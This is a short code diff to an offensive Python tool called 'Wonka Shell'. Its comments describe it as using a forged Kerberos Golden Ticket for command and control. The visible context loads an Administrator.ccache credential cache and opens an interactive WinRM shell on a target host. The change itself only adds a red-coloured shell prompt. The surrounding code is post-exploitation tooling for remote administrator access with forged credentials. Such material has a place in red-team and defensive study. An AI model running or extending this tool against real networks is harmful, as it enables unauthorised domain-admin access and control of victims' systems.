@@ -5,6 +5,10 @@ import winrm
 
 # Wonka Shell - Use Golden Ticket for Command and Control
 
+# ANSI Color Codes
+RED = '\033[91m'
+RESET = '\033[0m'
+
 os.environ['KRB5CCNAME'] = os.path.abspath('Administrator.ccache')
 
 def parse_args():
@@ -37,9 +41,11 @@ def main():
         print(f"[+] Connected successfully as: {test_res.std_out.decode('utf-8').strip()}")
         print(f"[+] Entering interactive WinRM shell on {target}. Type 'exit' to quit.\n")
 
+        prompt = f"{RED}[WSH]{RESET} PS> "
+
         while True:
             try:
-                cmd = input("PS C:\\> ").strip()
+                cmd = input(prompt).strip()
                 if not cmd:
                     continue
                 if cmd.lower() in ['exit', 'quit']:
